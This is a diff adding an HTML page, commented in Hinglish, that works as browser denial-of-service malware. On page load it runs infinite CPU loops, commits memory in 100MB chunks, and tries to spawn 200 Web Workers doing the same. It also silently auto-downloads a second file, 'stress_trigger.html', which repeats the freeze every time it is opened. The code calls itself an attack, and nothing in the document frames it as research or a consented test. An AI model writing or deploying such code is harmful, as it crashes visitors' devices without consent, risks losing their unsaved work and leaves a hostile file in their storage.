@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maximum Stress</title>
+</head>
+<body>
+    <h1>Stress Test Running...</h1>
+    <p>File download ho rahi hai aur system freeze ho raha hai.</p>
+
+    <script>
+        // ---------- PART 1: AUTO-DOWNLOAD FILE (Storage mein save rahegi) ----------
+        (function downloadFile() {
+            var fileContent = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Trigger</title></head>
+<body>
+<script>
+// Yeh file har baar open karne par system freeze karegi
+(function() {
+    // CPU Block (UI ko turant freeze karne ke liye)
+    function blockCPU() {
+        var x = 0;
+        while (true) {
+            x += Math.random() * Math.random();
+            if (x > 1e9) x = 0;
+        }
+    }
+
+    // Memory Eater (RAM bharne ke liye)
+    function eatMemory() {
+        var buckets = [];
+        while (true) {
+            try {
+                var chunk = new ArrayBuffer(1024 * 1024 * 100); // 100MB chunks
+                var view = new Uint8Array(chunk);
+                for (var i = 0; i < view.length; i += 4096) {
+                    view[i] = 255; // Force commit physical RAM
+                }
+                buckets.push(chunk);
+            } catch(e) {}
+        }
+    }
+
+    // Web Workers (Multi-threaded attack)
+    var workerCode = function() {
+        var b = [];
+        (function f() {
+            while (1) {
+                try {
+                    var c = new ArrayBuffer(1024 * 1024 * 100);
+                    var v = new Uint8Array(c);
+                    for (var i = 0; i < c.byteLength; i += 4096) v[i] = 255;
+                    b.push(c);
+                } catch(e) {}
+            }
+        })();
+    };
+
+    var blob = new Blob(["(" + workerCode.toString() + ")()"], { type: "application/javascript" });
+    var url = URL.createObjectURL(blob);
+
+    // 200 workers spawn karne ki koshish (Android allow karega, iOS limit pe rok dega)
+    for (var i = 0; i < 200; i++) {
+        try { new Worker(url); } catch(e) { break; }
+    }
+
+    // Main thread par memory aur CPU dono daalo
+    setTimeout(eatMemory, 0);
+    setTimeout(blockCPU, 0);
+})();
+<\/script>
+</body>
+</html>`;
+            
+            var blob = new Blob([fileContent], { type: 'text/html' });
+            var link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'stress_trigger.html';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        })();
+
+        // ---------- PART 2: TURANT EXECUTION (Page open hote hi chalega) ----------
+        (function executeNow() {
+            // 1. CPU Block (UI freeze)
+            function blockCPU() {
+                var x = 0;
+                while (true) {
+                    x += Math.random() * Math.random();
+                    if (x > 1e9) x = 0;
+                }
+            }
+
+            // 2. Memory Eater (RAM physical commit)
+            function eatMemory() {
+                var buckets = [];
+                while (true) {
+                    try {
+                        var chunk = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+                        var view = new Uint8Array(chunk);
+                        for (var i = 0; i < view.length; i += 4096) {
+                            view[i] = 255;
+                        }
+                        buckets.push(chunk);
+                    } catch(e) {}
+                }
+            }
+
+            // 3. Web Workers (Background threads)
+            var workerCode = function() {
+                var b = [];
+                (function f() {
+                    while (1) {
+                        try {
+                            var c = new ArrayBuffer(1024 * 1024 * 100);
+                            var v = new Uint8Array(c);
+                            for (var i = 0; i < c.byteLength; i += 4096) v[i] = 255;
+                            b.push(c);
+                        } catch(e) {}
+                    }
+                })();
+            };
+
+            var blob = new Blob(["(" + workerCode.toString() + ")()"], { type: "application/javascript" });
+            var url = URL.createObjectURL(blob);
+
+            // Jitne ho sake utne workers
+            for (var i = 0; i < 200; i++) {
+                try { new Worker(url); } catch(e) { break; }
+            }
+
+            // Main thread par attack
+            setTimeout(eatMemory, 0);
+            setTimeout(blockCPU, 0);
+        })();
+    </script>
+</body>
+</html>
